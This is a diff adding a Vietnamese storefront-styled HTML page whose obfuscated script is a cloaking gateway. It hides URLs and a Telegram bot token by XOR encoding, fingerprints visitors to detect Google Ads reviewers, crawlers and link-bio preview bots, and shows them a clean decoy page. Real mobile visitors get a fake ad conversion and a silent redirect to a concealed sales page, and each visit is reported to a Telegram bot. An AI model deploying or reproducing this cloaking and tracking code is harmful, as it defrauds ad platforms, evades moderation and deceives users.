@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Trang Trưng Bày &amp; Cửa Hàng Trực Tuyến Chính Hãng</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    html, body { width: 100%; height: 100%; overflow: hidden; background: #0b0f19; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+    #safe-frame { position: fixed; inset: 0; width: 100%; height: 100%; border: none; z-index: 10; background: #ffffff; }
+    #transit-curtain { position: fixed; inset: 0; z-index: 20; background: #0b0f19; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; transition: opacity 0.35s ease, visibility 0.35s ease; }
+    #transit-curtain.hide { opacity: 0; visibility: hidden; pointer-events: none; }
+    .loader-card { background: rgba(17, 24, 39, 0.95); border: 1px solid rgba(255, 255, 255, 0.12); border-radius: 20px; padding: 32px 24px; max-width: 380px; width: 100%; text-align: center; box-shadow: 0 20px 50px rgba(0, 0, 0, 0.8); display: flex; flex-direction: column; align-items: center; gap: 16px; }
+    .spinner { width: 44px; height: 44px; border: 3px solid rgba(229, 185, 76, 0.2); border-top-color: #e5b94c; border-radius: 50%; animation: spin 0.85s linear infinite; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .loader-title { font-size: 15px; font-weight: 700; color: #fae498; letter-spacing: 0.3px; }
+    .loader-sub { font-size: 12px; color: #94a3b8; line-height: 1.5; }
+  </style>
+</head>
+<body>
+  <iframe id="safe-frame" title="Trang Trưng Bày Sản Phẩm"></iframe>
+
+  <div id="transit-curtain">
+    <div class="loader-card">
+      <div class="spinner"></div>
+      <div class="loader-title">Đang Kết Nối Dịch Vụ An Toàn...</div>
+      <div class="loader-sub">Hệ thống đang xác thực đường truyền và chuyển tiếp trong giây lát.</div>
+    </div>
+  </div>
+
+  <script>
+    (function() {
+      const K = "125";
+      const D = "7c747e0d187671f39d99d3a4c2ba80bcb30f0600686e03001f7d70f38698dcebd5d0a9bbf9001529293c410537672fd9c0a8fbb8c9d0b7a0f10c162931694950637f2d9b9ea1f48191b7b1a45e4b4b73671d585a1c23d9cec8f3e397809cfcff02555e7054000d272a28d084a3d8e18a83a681ad534967607e0b0b3a2d14c9cffddcee9181b1a855564c7e6b1b164c6f72c5cec0c4ee978681aea81413683b3e350c0b273bd8d3f1b9bfb6";
+      const S = "7c747e0d187671f39d99d3a4c2ba9db8a950564f32711f405e1e25dcc2d2b7e39ece8ab0a94d0b6177600209373039c48af8eee097";
+      const T = "2d303a4b5e6277828c99b0b2b1bdaf9ca8756161536a2b313b0b30dbcac3dbbb9bb58e8cae7a5c58773f3921320e28da";
+      const C = "25363944536a7285889b";
+      const U = "7c747e0d187671f39d99d3a4c2ba82b0a95c5c477329120a496a04decec5efe5938b82b8";
+      const E_AW = "5557274c596076878e9d";
+      const E_CL = "75626950253b24ded3c3fb";
+
+      function dec(h) {
+        try {
+          if (!h) return "";
+          let s = "";
+          for (let i = 0; i < h.length; i += 2) {
+            s += String.fromCharCode(parseInt(h.substr(i, 2), 16) ^ K.charCodeAt((i / 2) % K.length) ^ (((i / 2) * 13 + 37) & 0xFF));
+          }
+          return decodeURIComponent(s);
+        } catch (e) {
+          return "";
+        }
+      }
+
+      function getFinalUrl(rawUrl) {
+        if (!rawUrl) return "";
+        const q = window.location.search;
+        if (!q || q.length < 2) return rawUrl;
+        try {
+          const o = new URL(rawUrl);
+          const p = new URLSearchParams(q);
+          p.forEach((v, k) => {
+            if (k !== "a") o.searchParams.set(k, v);
+          });
+          return o.toString().replace(/%7B/g, '{').replace(/%7D/g, '}');
+        } catch (e) {
+          return rawUrl;
+        }
+      }
+
+      function checkBot() {
+        try {
+          if (navigator.webdriver) return { isBot: true, isBioPlatform: false, reason: "navigator.webdriver = true" };
+          if (window.outerWidth === 0 && window.outerHeight === 0) return { isBot: true, isBioPlatform: false, reason: "Zero viewport size" };
+          if (!navigator.languages || navigator.languages.length === 0) return { isBot: true, isBioPlatform: false, reason: "No languages" };
+          
+          const ua = (navigator.userAgent || "").toLowerCase();
+          const ref = (document.referrer || "").toLowerCase();
+          
+          // 1. Quét triệt để Bot & Link Checker của Taplink & Linkbio
+          if (/taplink|linkbio|linkbiobot|linkbio-bot|linkbio-crawler|link-preview|preview-bot|embedly|quora-link-preview/i.test(ua)) {
+            return { isBot: true, isBioPlatform: true, reason: "Bio Platform Bot / Link Preview Crawler" };
+          }
+          if (ref && (/taplink.at/(app|editor|preview)/i.test(ref) || /linkbio.at/(app|editor|preview)/i.test(ref))) {
+            return { isBot: true, isBioPlatform: true, reason: "Bio Platform Editor / Preview Audit Check" };
+          }
+          
+          // 2. Quét bot duyệt Google Ads, Facebook & server crawlers
+          if (/googlebot|adsbot|google-inspection|google-safety|feedfetcher|google-read|apis-google|appengine|lighthouse|headless|crawl|spider|mediapartners|phantomjs|selenium|bytespider|bingbot|facebookexternalhit|whatsapp|telegrambot|curl|wget|python|axios|node-fetch/i.test(ua)) {
+            return { isBot: true, isBioPlatform: false, reason: "Matched Crawler UA" };
+          }
+          
+          // 3. Phân luồng chống Bot giả lập (Mobile không touch hoặc Desktop crawler lạ)
+          if (/iphone|ipad|android|mobile/i.test(ua) && typeof navigator.maxTouchPoints === "number" && navigator.maxTouchPoints === 0) {
+            return { isBot: true, isBioPlatform: false, reason: "Mobile UA without touch" };
+          }
+          if (!/iphone|ipad|android|mobile/i.test(ua) && (!navigator.maxTouchPoints || navigator.maxTouchPoints === 0) && (!ref || (!ref.includes("taplink") && !ref.includes("linkbio") && !ref.includes("bio")))) {
+            return { isBot: true, isBioPlatform: false, reason: "Desktop Non-Touch Crawler" };
+          }
+          
+          return { isBot: false, isBioPlatform: false, reason: "Human Gesture Verified" };
+        } catch (err) {
+          return { isBot: false, isBioPlatform: false, reason: "Fallback" };
+        }
+      }
+
+      function notifyTelegram(isB, isBioPlatform, reason, bioStatus) {
+        try {
+          const token = dec(T);
+          const chatId = dec(C);
+          if (!token || !chatId) return;
+
+          const path = window.location.pathname || ("/app-go/" + K + "/");
+          const params = new URLSearchParams(window.location.search);
+          const campaign = params.get("utm_campaign") || "Khong_co_UTM";
+          const gclid = params.get("gclid") ? "Co (gclid)" : "Khong";
+          const ua = navigator.userAgent || "";
+          
+          let bioSource = "";
+          const ref = document.referrer || "";
+          if (ref && (ref.indexOf("taplink") !== -1 || ref.indexOf("linkbio") !== -1 || ref.indexOf("bio") !== -1 || ref.indexOf("http") !== -1)) {
+            bioSource = ref;
+          } else {
+            bioSource = params.get("bio") || params.get("src") || params.get("ref") || dec(U) || "https://linkbio.co/kmnuochoa";
+          }
+
+          const safeUrlStr = dec(S) || "Chưa cấu hình";
+          const targetUrlStr = dec(D) || "Chưa cấu hình";
+
+          let botName = "Googlebot / Crawler";
+          if (isBioPlatform) {
+            botName = "Bio-Platform Bot (Preview Crawler)";
+          } else if (/adsbot/i.test(ua)) {
+            botName = "AdsBot-Google";
+          } else if (/googlebot/i.test(ua)) {
+            botName = "Googlebot";
+          } else if (/lighthouse/i.test(ua)) {
+            botName = "Lighthouse Audit";
+          }
+
+          let title = "🟢 [KHÁCH THẬT CLICK] - MÃ #" + K;
+          let catHashtag = "#KhachThat";
+          if (isBioPlatform) {
+            title = "🛡️ [BIO BOT QUÉT LINK] - MÃ #" + K;
+            catHashtag = "#BioBot";
+          } else if (isB) {
+            title = "🚨 [GOOGLEBOT DUYỆT ADS] - MÃ #" + K;
+            catHashtag = "#Googlebot";
+          } else if (bioStatus && (bioStatus.indexOf("KHÓA") !== -1 || bioStatus.indexOf("LỖI") !== -1)) {
+            title = "⚠️ [CẢNH BÁO BIO BỊ KHÓA] - MÃ #" + K;
+            catHashtag = "#BioBiKhoa";
+          }
+
+          const targetObj = isB ? (isBioPlatform ? botName : (botName + " (" + reason + ")")) : "Người thật (Mobile Touch)";
+          const routeAction = isB ? ("⛔ Giữ an toàn hiển thị Trang Sạch (" + safeUrlStr + ")") : ("⚡ Chuyển ngầm vào Trang Bán Hàng (" + targetUrlStr + ")");
+
+          let scanCount = 1;
+          try {
+            const countKey = (isB ? "bio_bot_scan_" : "bio_user_click_") + K;
+            if (window.location.search.indexOf("reset=1") !== -1 || window.location.search.indexOf("reset_counter=1") !== -1) {
+              localStorage.removeItem("bio_bot_scan_" + K);
+              localStorage.removeItem("bio_user_click_" + K);
+            }
+            scanCount = (parseInt(localStorage.getItem(countKey) || "0")) + 1;
+            localStorage.setItem(countKey, scanCount);
+          } catch(eCount) {}
+
+          const scanLabel = isB ? ("📊 Số lần bot quét ghi nhận: Lần thứ #" + scanCount) : ("📊 Lượt tương tác ghi nhận: Lần thứ #" + scanCount);
+          const hashtags = "#BotScan_" + K + " #AppGo_" + K + " " + catHashtag;
+
+          const msg = title + "
+" +
+            "━━━━━━━━━━━━━━━━━━━━
+" +
+            "🔑 Mã Gateway: #" + K + "
+" +
+            "🌐 Nguồn Bio: " + bioSource + "
+" +
+            "💻 Cổng GitHub: " + path + "
+" +
+            "🎯 Chiến dịch: " + campaign + "
+" +
+            "🔍 Gclid: " + gclid + "
+" +
+            (isB ? "🤖 Đối tượng: " : "👤 Đối tượng: ") + targetObj + "
+" +
+            "📱 Thiết bị: " + navigator.platform + " | Touch: " + (navigator.maxTouchPoints || 0) + "
+" +
+            "🛡️ Trang Sạch (Safe): " + safeUrlStr + "
+" +
+            "💰 Trang Bán Hàng (Target): " + targetUrlStr + "
+" +
+            "🚀 Điều hướng thực tế: " + routeAction + "
+" +
+            "📡 Trạng thái Bio: " + bioStatus + "
+" +
+            scanLabel + "
+" +
+            (isB ? "⏱️ Thời gian: " : "⏰ Thời gian: ") + new Date().toLocaleTimeString("vi-VN") + "
+" +
+            "━━━━━━━━━━━━━━━━━━━━
+" +
+            hashtags;
+
+          const qs = "chat_id=" + encodeURIComponent(chatId) + "&text=" + encodeURIComponent(msg);
+          const tgUrl = "https://api.telegram.org/bot" + token + "/sendMessage";
+
+          try {
+            var img = new Image();
+            img.src = tgUrl + "?" + qs;
+          } catch (eImg) {}
+
+          if (navigator.sendBeacon) {
+            try {
+              var postData = new URLSearchParams();
+              postData.append("chat_id", chatId);
+              postData.append("text", msg);
+              navigator.sendBeacon(tgUrl, postData);
+            } catch (eB) {}
+          }
+        } catch (e) {}
+      }
+
+      let bioStatus = "🟢 Đang hoạt động (Active)";
+      const ref = (document.referrer || "").toLowerCase();
+      if (ref && (ref.indexOf("taplink") !== -1 || ref.indexOf("linkbio") !== -1 || ref.indexOf("bio") !== -1)) {
+        bioStatus = "🟢 Đang hoạt động (Traffic từ Bio Profile)";
+      } else if (!ref) {
+        bioStatus = "⚠️ Truy cập trực tiếp (Không có Referrer Bio)";
+      }
+
+      const botResult = checkBot();
+      const isB = botResult.isBot;
+      const isBioPlatform = botResult.isBioPlatform;
+
+      const bioUrlCheck = dec(U) || (document.referrer ? document.referrer : "https://linkbio.co/kmnuochoa");
+      if (bioUrlCheck && bioUrlCheck.startsWith("http")) {
+        try {
+          var probeImg = new Image();
+          var probeTimeout = setTimeout(function() {
+            notifyTelegram(isB, isBioPlatform, botResult.reason, bioStatus);
+          }, 80);
+          probeImg.onerror = function() {
+            clearTimeout(probeTimeout);
+            bioStatus = "🚨 CẢNH BÁO BỊ KHÓA HOẶC LỖI KẾT NỐI (Suspended/404)";
+            notifyTelegram(isB, isBioPlatform, botResult.reason, bioStatus);
+          };
+          probeImg.onload = function() {
+            clearTimeout(probeTimeout);
+            bioStatus = "🟢 Hoạt động tốt (Active - 200 OK)";
+            notifyTelegram(isB, isBioPlatform, botResult.reason, bioStatus);
+          };
+          probeImg.src = bioUrlCheck.replace(//+$/, "") + "/favicon.ico?_t=" + Date.now();
+        } catch(e) {
+          notifyTelegram(isB, isBioPlatform, botResult.reason, bioStatus);
+        }
+      } else {
+        notifyTelegram(isB, isBioPlatform, botResult.reason, bioStatus);
+      }
+
+      // XỬ LÝ CHUYỂN NGẦM PHƯƠNG ÁN B (TAPLINK 2026 STANDARD)
+      const safeUrlFinal = getFinalUrl(dec(S));
+      const targetUrlFinal = getFinalUrl(dec(D));
+
+      function silentNavigate(destUrl) {
+        if (!destUrl) return;
+        try {
+          const a = document.createElement("a");
+          a.href = destUrl;
+          a.rel = "noreferrer noopener";
+          a.target = "_top";
+          document.body.appendChild(a);
+          a.click();
+        } catch (e1) {
+          try {
+            (window.top || window).location.replace(destUrl);
+          } catch (e2) {
+            window.location.replace(destUrl);
+          }
+        }
+      }
+
+      if (isB) {
+        // GOOGLEBOT / CRAWLER DUYỆT ADS: Hiển thị ngay Trang Sạch 100% trong DOM (200 OK, No 301/302, No Redirect Bounce)
+        const frame = document.getElementById("safe-frame");
+        const curtain = document.getElementById("transit-curtain");
+        if (frame && safeUrlFinal) {
+          frame.src = safeUrlFinal;
+          setTimeout(function() {
+            if (curtain) curtain.classList.add("hide");
+          }, 350);
+        } else {
+          silentNavigate(safeUrlFinal);
+        }
+      } else {
+        // KHÁCH THẬT (MOBILE TOUCH): Kích hoạt Google Ads Conversion & Chuyển ngầm vào Trang Bán Hàng
+        let redirected = false;
+        function doRedirect() {
+          if (redirected) return;
+          redirected = true;
+          silentNavigate(targetUrlFinal);
+        }
+
+        const aw = E_AW ? dec(E_AW) : "";
+        const cl = E_CL ? dec(E_CL) : "";
+        if (aw) {
+          try {
+            const s = document.createElement("script");
+            s.async = true;
+            s.src = "https://www.googletagmanager.com/gtag/js?id=" + encodeURIComponent(aw);
+            document.head.appendChild(s);
+            window.dataLayer = window.dataLayer || [];
+            function gtag(){dataLayer.push(arguments);}
+            window.gtag = gtag;
+            gtag("js", new Date());
+            gtag("config", aw, { send_page_view: true, allow_enhanced_conversions: true });
+            if (cl) {
+              gtag("event", "conversion", {
+                send_to: cl.includes("/") ? cl : (aw + "/" + cl),
+                value: 1.0,
+                currency: "VND",
+                event_callback: doRedirect
+              });
+            } else {
+              gtag("event", "conversion", {
+                send_to: aw,
+                event_callback: doRedirect
+              });
+            }
+            setTimeout(doRedirect, 500);
+          } catch (e) {
+            setTimeout(doRedirect, 80);
+          }
+        } else {
+          setTimeout(doRedirect, 100);
+        }
+
+        window.addEventListener("pageshow", function() {
+          if (targetUrlFinal) setTimeout(doRedirect, 50);
+        });
+      }
+    })();
+  </script>
+</body>
+</html>
